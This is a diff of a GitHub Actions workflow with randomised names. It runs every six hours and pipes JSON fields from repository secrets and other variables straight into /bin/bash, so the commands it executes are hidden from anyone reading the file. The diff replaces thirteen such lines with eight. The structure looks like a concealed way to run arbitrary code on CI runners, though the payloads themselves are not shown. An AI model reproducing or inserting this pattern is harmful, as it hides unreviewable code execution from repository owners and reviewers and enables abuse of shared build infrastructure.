@@ -1,31 +1,24 @@
 name: overcookedmiserable
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 0/6 * * *'
+    - cron: '24 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: overcookedmiserable
         env:
-          ywvqo02: ${{ secrets.ywvqo02 }}
+          yh01861: ${{ secrets.yh01861 }}
         run: |
-          echo $ywvqo02 | jq -r .h96 | /bin/bash
-          echo $atoq621 | jq -r .gm37631 | /bin/bash
-          echo $okmg5980 | jq -r .qai8 | /bin/bash
-          echo $pe3 | jq -r .nqlen23 | /bin/bash
-          echo $na22804 | jq -r .erzie0 | /bin/bash
-          echo $oh27 | jq -r .v0 | /bin/bash
-          echo $oejqa935 | jq -r .nnryz0 | /bin/bash
-          echo $avss25515 | jq -r .xnsfd58 | /bin/bash
-          echo $wl33844 | jq -r .u818 | /bin/bash
-          echo $gy908 | jq -r .efqqw1 | /bin/bash
-          echo $eg061 | jq -r .dt1428 | /bin/bash
-          echo $sdwy681 | jq -r .lx78 | /bin/bash
-          echo $ws86722 | jq -r .aetrt9155 | /bin/bash
+          echo $yh01861 | jq -r .lhxqp4 | /bin/bash
+          echo $racfw01889 | jq -r .mbqva552 | /bin/bash
+          echo $ns155 | jq -r .rliub40127 | /bin/bash
+          echo $mwiu341 | jq -r .os6897 | /bin/bash
+          echo $vg1 | jq -r .jml338 | /bin/bash
+          echo $tl204 | jq -r .ddeek889 | /bin/bash
+          echo $emzho50434 | jq -r .wz46215 | /bin/bash
+          echo $iae6678 | jq -r .gfeph83933 | /bin/bash
 
